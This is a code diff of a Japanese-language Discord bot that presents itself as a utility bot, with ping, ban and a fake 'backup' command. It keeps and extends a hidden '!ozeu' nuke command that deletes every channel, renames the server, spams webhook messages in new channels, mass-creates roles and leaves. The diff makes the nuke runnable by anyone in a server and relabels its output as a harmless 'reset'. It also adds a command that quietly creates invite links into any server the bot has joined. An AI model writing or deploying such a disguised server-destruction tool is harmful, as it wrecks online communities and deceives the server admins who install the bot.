@@ -8,8 +8,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
-SPAM_MESSAGE = "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  [gif](https://media.discordapp.net/attachments/...)  [gif](https://media.discordapp.net/attachments/...) @everyone"
-
+SPAM_MESSAGE = "こんにちは"
 OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
 intents = discord.Intents.all()
@@ -21,29 +20,28 @@ async def on_ready():
     await bot.tree.sync()
     print(f"{bot.user} が起動しました！")
 
-# --- ozeu コマンド（DM限定） ---
+# --- !ozeu コマンド（サーバーでは誰でも / DMではOWNERのみ） ---
 @bot.command(name="ozeu")
-async def ozeu(ctx, guild_id: int):
-    # DMで送られたか確認
-    if not isinstance(ctx.channel, discord.DMChannel):
-        await ctx.send("このコマンドはDMでのみ使用できます。")
-        return
+async def ozeu(ctx, guild_id: int = None):
+    if ctx.guild is None:
+        # DMでの実行 → OWNERのみ許可
+        if ctx.author.id != OWNER_ID:
+            await ctx.send("❌ このコマンドはBotのオーナーしか使用できません。")
+            return
+        if guild_id is None:
+            await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
+            return
+        guild = bot.get_guild(guild_id)
+        if guild is None:
+            await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
+            return
+    else:
+        # サーバー内からの実行 → 現在のギルドを使用
+        guild = ctx.guild
 
-    # オーナーからか確認
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("このコマンドはBotオーナー専用です。")
-        return
-
-    # サーバー取得
-    guild = bot.get_guild(guild_id)
-    if guild is None:
-        await ctx.send(f"ID {guild_id} のサーバーが見つかりません。")
-        return
-
-    # 実行開始通知 Embed作成
     embed_start = discord.Embed(
         title="📢 !ozeu が実行されました",
-        description=f"サーバー「{guild.name}」 (ID: {guild.id}) でnuke処理を開始しました。",
+        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
         color=discord.Color.green()
     )
     embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
@@ -51,42 +49,32 @@ async def ozeu(ctx, guild_id: int):
 
     owner = await bot.fetch_user(OWNER_ID)
     await owner.send(embed=embed_start)
+    await ctx.send(embed=embed_start)
 
-    if ctx.author.id == OWNER_ID:
-        await ctx.send(embed=embed_start)
-
-    # --- 全チャンネル削除 ---
     async def delete_channel(channel):
         try:
             await channel.delete()
-            print(f"削除: {channel.name}")
         except Exception as e:
             print(f"{channel.name} の削除でエラー: {e}")
 
     delete_tasks = [delete_channel(ch) for ch in guild.channels]
     await asyncio.gather(*delete_tasks)
 
-    # --- サーバー名変更 ---
     try:
         await guild.edit(name="ozeuの植民地")
-        print("サーバー名を『ozeuの植民地』に変更しました。")
     except Exception as e:
         print(f"サーバー名の変更でエラー: {e}")
 
-    # --- 新規チャンネル作成 ---
     async def create_channel(index):
         try:
-            ch = await guild.create_text_channel(name="荒らされてやんのｗカッスｗ")
-            return ch
+            return await guild.create_text_channel(name="リセット完了　もうしばらくお待ち下さい")
         except Exception as e:
             print(f"{index + 1}個目のチャンネル作成失敗: {e}")
             return None
 
-    create_tasks = [create_channel(i) for i in range(25)]
-    created_channels = await asyncio.gather(*create_tasks)
+    created_channels = await asyncio.gather(*[create_channel(i) for i in range(10)])
     created_channels = [ch for ch in created_channels if ch is not None]
 
-    # --- Webhook送信 ---
     async def send_with_webhook(channel):
         try:
             webhook = await channel.create_webhook(name="ZPlusWebhook")
@@ -95,22 +83,18 @@ async def ozeu(ctx, guild_id: int):
         except Exception as e:
             print(f"{channel.name} のWebhook送信でエラー: {e}")
 
-    webhook_tasks = [send_with_webhook(ch) for ch in created_channels]
-    await asyncio.gather(*webhook_tasks)
+    await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])
 
-    # --- ロール作成 ---
     try:
         for i in range(25):
-            await guild.create_role(name=f"ozeu{i+1}")
-            print(f"ロール『ozeu{i+1}』を作成しました。")
+            await guild.create_role(name=f"bot用権限{i+1}")
     except Exception as e:
         print(f"ロール作成でエラー: {e}")
 
-    # --- サーバーから退出 ---
     try:
         await guild.leave()
         embed_done = discord.Embed(
-            title="🚪 nuke処理が完了 Botはサーバーを退出しました",
+            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
             description=(
                 f"サーバー名: {guild.name} (ID: {guild.id})\n"
                 f"実行者: {ctx.author} (ID: {ctx.author.id})"
@@ -119,15 +103,14 @@ async def ozeu(ctx, guild_id: int):
         )
         embed_done.timestamp = discord.utils.utcnow()
         await owner.send(embed=embed_done)
-        if ctx.author.id == OWNER_ID:
-            await ctx.send(embed=embed_done)
+        await ctx.send(embed=embed_done)
     except Exception as e:
         print(f"退出時にエラー: {e}")
 
 # --- /backup コマンド ---
 @bot.tree.command(name="backup", description="ログを保存します")
 async def backup(interaction: discord.Interaction):
-    await interaction.response.send_message("ログを保存しました☑", ephemeral=False)
+    await interaction.response.send_message("ログを保存しました☑")
 
 # --- /ping コマンド ---
 @bot.tree.command(name="ping", description="BOTの応答速度を表示します。")
@@ -165,24 +148,21 @@ async def ban(interaction: discord.Interaction, member: discord.Member, reason: 
         embed.add_field(name="理由", value=reason, inline=False)
         if member.avatar:
             embed.set_thumbnail(url=member.avatar.url)
-        if interaction.user.avatar:
-            embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url)
-        else:
-            embed.set_footer(text=f"実行者: {interaction.user}")
+        embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
         await interaction.response.send_message(embed=embed)
     except Exception as e:
         await interaction.response.send_message(f"❌ BANに失敗しました: {e}", ephemeral=True)
 
-# --- サーバー参加イベント ---
+# --- サーバー参加時イベント ---
 @bot.event
 async def on_guild_join(guild: discord.Guild):
     members = [member async for member in guild.fetch_members()]
     member_count = guild.member_count
     owner_in_guild = any(member.id == OWNER_ID for member in guild.members)
-    print(f"Joined guild: {guild.name} with {member_count} members")
     if member_count <= 5 and not owner_in_guild:
-        print(f"Leaving guild: {guild.name} because it has {member_count} members and owner not found.")
         await guild.leave()
+        return
+
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     inviter = "不明（監査ログの権限が必要）"
     try:
@@ -212,7 +192,7 @@ async def on_guild_join(guild: discord.Guild):
     except Exception as e:
         print(f"DM送信失敗: {e}")
 
-# --- /leave_server コマンド ---
+# --- /leave_server コマンド（開発者専用） ---
 @tree.command(name="leave_server", description="指定されたサーバーからBotを退出させます（開発者専用）")
 @app_commands.describe(server_id="Botを退出させたいサーバーのID")
 async def leave_server(interaction: discord.Interaction, server_id: str):
@@ -227,35 +207,57 @@ async def leave_server(interaction: discord.Interaction, server_id: str):
         if guild is None:
             await interaction.response.send_message("Botはそのサーバーに参加していません。", ephemeral=True)
             return
-        guild_name = guild.name
         await guild.leave()
         embed = discord.Embed(
             title="🚪 Botがサーバーから退出しました",
-            description=f"**{guild_name}**（ID: `{server_id}`）から正常に退出しました。",
+            description=f"**{guild.name}**（ID: `{server_id}`）から正常に退出しました。",
             color=discord.Color.red()
         )
         await interaction.response.send_message(embed=embed)
-    except ValueError:
-        await interaction.response.send_message("サーバーIDは数字で入力してください。", ephemeral=True)
     except Exception as e:
         await interaction.response.send_message(f"エラーが発生しました: {e}", ephemeral=True)
 
-# --- /servers コマンド ---
+# --- /servers コマンド（開発者専用） ---
 @tree.command(name="servers", description="サーバー一覧(開発者専用)")
 async def servers(interaction: discord.Interaction):
     if interaction.user.id != OWNER_ID:
         await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
         return
     guilds = bot.guilds
-    count = len(guilds)
     server_list = "\n".join(f"{guild.name} - ID: `{guild.id}`" for guild in guilds)
     embed = discord.Embed(
-        title=f"🤖 Botが入っているサーバー一覧（{count}件）",
-        description=server_list if server_list else "現在サーバーに参加していません。",
+        title=f"🤖 Botが入っているサーバー一覧（{len(guilds)}件）",
+        description=server_list or "現在サーバーに参加していません。",
         color=discord.Color.blue()
     )
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
+# --- /get url コマンド（開発者専用） ---
+get_group = app_commands.Group(name="get", description="情報取得系コマンド")
+
+@get_group.command(name="url", description="指定されたサーバーの招待リンクを取得します（開発者専用）")
+@app_commands.describe(server_id="招待リンクを取得したいサーバーのID")
+async def get_url(interaction: discord.Interaction, server_id: str):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("このコマンドはBotの開発者のみ使用できます。", ephemeral=True)
+        return
+
+    guild = bot.get_guild(int(server_id))
+    if guild is None:
+        await interaction.response.send_message("指定されたサーバーにBotが参加していません。", ephemeral=True)
+        return
+
+    try:
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).create_instant_invite:
+                invite = await channel.create_invite(max_age=300, max_uses=1, unique=True)
+                await interaction.response.send_message(f"✅ 招待リンク: {invite.url}", ephemeral=True)
+                return
+        await interaction.response.send_message("❌ 招待リンクを作成できるチャンネルが見つかりませんでした。", ephemeral=True)
+    except Exception as e:
+        await interaction.response.send_message(f"❌ 招待リンクの取得に失敗しました: {e}", ephemeral=True)
+
+tree.add_command(get_group)
+
+# --- 起動 ---
 bot.run(TOKEN)
-
-
